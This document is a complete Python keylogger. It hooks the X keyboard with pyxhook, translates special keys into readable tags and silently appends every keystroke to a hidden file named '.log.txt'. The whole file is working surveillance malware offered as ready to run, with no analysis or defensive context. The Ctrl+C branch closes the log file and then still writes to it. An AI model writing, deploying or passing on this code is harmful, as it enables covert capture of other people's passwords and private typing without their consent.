#!/usr/bin/python

import pyxhook

# Adapt the path/filename according with your needs
FILENAME = '.log.txt'

#this function is called everytime a key is pressed.
def OnKeyPress(event):

  keylogger = open(FILENAME,'a')

  if (event.Key == "space"):
  	event.Key = "<space>"
  elif (event.Ascii == 13):
  	event.Key = '<Enter>\n'
  elif (event.Ascii == 27):
  	event.Key = '<ESC>'
  elif (event.Ascii == 9):
  	event.Key = '<Tab>'
  elif (event.Ascii == 8):
  	event.Key = '<BackSpace>'
  elif (event.Key == 'Delete'):
  	event.Key = '<DEL>'
  elif (event.Key == 'Control_L'):
  	event.Key = '<Control_L>'
  elif (event.Key == 'Control_R'):
  	event.Key = '<Control_R>'
  elif (event.Key == 'Shift_L'):
  	event.Key = '<Shift_L>'
  elif (event.Key == 'Shift_R'):
  	event.Key = '<Shift_R>'
  elif (event.Key == 'Up'):
  	event.Key = '<Up>'
  elif (event.Key == 'Down'):
  	event.Key = '<Down>'
  elif (event.Key == 'Left'):
  	event.Key = '<Left>'
  elif (event.Key == 'Right'):
  	event.Key = '<Right>'
  elif (event.Key == 'Alt_L'):
  	event.Key = '<Alt_L>'
  elif (event.Key == 'Alt_R'):
  	event.Key = '<Alt_R>'
  elif (event.Key == 'exclam'):
  	event.Key = '!'
  elif (event.Key == 'quotedbl'):
  	event.Key = '"'
  elif (event.Key == 'bar'):
  	event.Key = '|'
  elif (event.Key == 'numbersign'):
  	event.Key = '#'
  elif (event.Key == 'dollar'):
  	event.Key = '$'
  elif (event.Key == 'percent'):
  	event.Key = '%'
  elif (event.Key == 'ampersand'):
  	event.Key = '&'
  elif (event.Key == 'parenleft'):
  	event.Key = '('
  elif (event.Key == 'parenright'):
  	event.Key = ')'
  elif (event.Key == 'equal'):
  	event.Key = '='
  elif (event.Key == 'question'):
  	event.Key = '?'
  elif (event.Ascii == 3):
  	keylogger.write('\n<Script Terminated>')
  	keylogger.close()

  keylogger.write(event.Key)

# instantiate HookManager class
hooks_manager = pyxhook.HookManager()
# listen to all keystrokes
hooks_manager.KeyDown = OnKeyPress
# hook the keyboard
hooks_manager.HookKeyboard()
# start the session
hooks_manager.start()